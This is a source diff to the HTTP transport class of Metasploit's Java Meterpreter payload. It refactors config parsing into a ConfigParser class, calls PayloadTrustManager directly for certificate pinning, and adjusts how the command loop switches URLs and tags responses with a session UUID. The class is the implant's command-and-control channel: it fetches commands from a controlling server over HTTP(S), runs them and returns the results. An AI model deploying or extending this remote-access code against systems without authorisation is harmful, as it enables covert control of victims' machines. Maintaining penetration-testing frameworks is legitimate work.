@@ -1,6 +1,8 @@
 package com.metasploit.meterpreter;
 
 import com.metasploit.meterpreter.command.Command;
+import com.metasploit.stage.ConfigParser;
+import com.metasploit.stage.PayloadTrustManager;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
@@ -12,12 +14,6 @@ import java.net.URL;
 import java.net.URLConnection;
 
 public class HttpTransport extends Transport {
-    private static final int UA_LEN = 256;
-    private static final int PROXY_HOST_LEN = 128;
-    private static final int PROXY_USER_LEN = 64;
-    private static final int PROXY_PASS_LEN = 64;
-    private static final int CERT_HASH_LEN = 20;
-    private static final String TRUST_MANAGER = "com.metasploit.meterpreter.PayloadTrustManager";
 
     private URL targetUrl = null;
     private URL nextUrl = null;
@@ -55,21 +51,21 @@ public class HttpTransport extends Transport {
     public int parseConfig(byte[] configuration, int offset) {
         offset = this.parseTimeouts(configuration, offset);
 
-        this.proxy = Meterpreter.readString(configuration, offset, PROXY_HOST_LEN);
-        offset += PROXY_HOST_LEN;
+        this.proxy = ConfigParser.readString(configuration, offset, ConfigParser.PROXY_HOST_LEN);
+        offset += ConfigParser.PROXY_HOST_LEN;
 
-        this.proxyUser = Meterpreter.readString(configuration, offset, PROXY_USER_LEN);
-        offset += PROXY_USER_LEN;
+        this.proxyUser = ConfigParser.readString(configuration, offset, ConfigParser.PROXY_USER_LEN);
+        offset += ConfigParser.PROXY_USER_LEN;
 
-        this.proxyPass = Meterpreter.readString(configuration, offset, PROXY_PASS_LEN);
-        offset += PROXY_PASS_LEN;
+        this.proxyPass = ConfigParser.readString(configuration, offset, ConfigParser.PROXY_PASS_LEN);
+        offset += ConfigParser.PROXY_PASS_LEN;
 
-        this.userAgent = Meterpreter.readString(configuration, offset, UA_LEN);
-        offset += UA_LEN;
+        this.userAgent = ConfigParser.readString(configuration, offset, ConfigParser.UA_LEN);
+        offset += ConfigParser.UA_LEN;
 
         this.certHash = null;
-        byte[] loadedHash = Meterpreter.readBytes(configuration, offset, CERT_HASH_LEN);
-        offset += CERT_HASH_LEN;
+        byte[] loadedHash = ConfigParser.readBytes(configuration, offset, ConfigParser.CERT_HASH_LEN);
+        offset += ConfigParser.CERT_HASH_LEN;
 
         // we only store the cert hash value if it's got a value
         for (int i = 0; i < loadedHash.length; i++) {
@@ -142,6 +138,9 @@ public class HttpTransport extends Transport {
             // is the situation that happens on initial connect (not reconnect)
             TLVPacket response = request.createResponse();
             int result = met.getCommandManager().executeCommand(met, request, response);
+            if (result == Command.EXIT_DISPATCH) {
+                return true;
+            }
             this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);
 
             return true;
@@ -209,6 +208,7 @@ public class HttpTransport extends Transport {
         while (!met.hasSessionExpired() &&
             System.currentTimeMillis() < lastPacket + this.commTimeout) {
             try {
+                useNextUrl();
                 TLVPacket request = this.readPacket();
 
                 if (request != null) {
@@ -219,6 +219,9 @@ public class HttpTransport extends Transport {
 
                     TLVPacket response = request.createResponse();
                     int result = met.getCommandManager().executeCommand(met, request, response);
+
+                    // Make sure the UUID is baked into each response.
+                    response.add(TLVType.TLV_TYPE_UUID, met.getUUID());
 
                     this.writePacket(response, TLVPacket.PACKET_TYPE_RESPONSE);
 
@@ -237,19 +240,19 @@ public class HttpTransport extends Transport {
                 break;
             }
 
-            // see if we switched URLs along the way, and if we did, move it on over.
-            // This is really only used for stageless payloads (not yet implemented in
-            // msf for this, but we're getting there). The command for this hasn't yet
-            // been wired in.
-            if (this.nextUrl != null) {
-                this.url = this.nextUrl.toString();
-                this.targetUrl = this.nextUrl;
-                this.nextUrl = null;
-            }
         }
 
         // if we get here we assume things aren't good.
         return false;
+    }
+
+    private void useNextUrl() {
+        // see if we switched URLs along the way, and if we did, move it on over.
+        if (this.nextUrl != null) {
+            this.url = this.nextUrl.toString();
+            this.targetUrl = this.nextUrl;
+            this.nextUrl = null;
+        }
     }
 
     private URLConnection createConnection() {
@@ -260,10 +263,8 @@ public class HttpTransport extends Transport {
 
             if (this.targetUrl.getProtocol().equals("https")) {
                 try {
-                    Class.forName(TRUST_MANAGER).getMethod("useFor", new Class[]{URLConnection.class})
-                      .invoke(null, new Object[]{conn});
-                }
-                catch (Exception ex) {
+                    PayloadTrustManager.useFor(conn, certHash);
+                } catch (Exception ex) {
                     // perhaps log?
                 }
             }
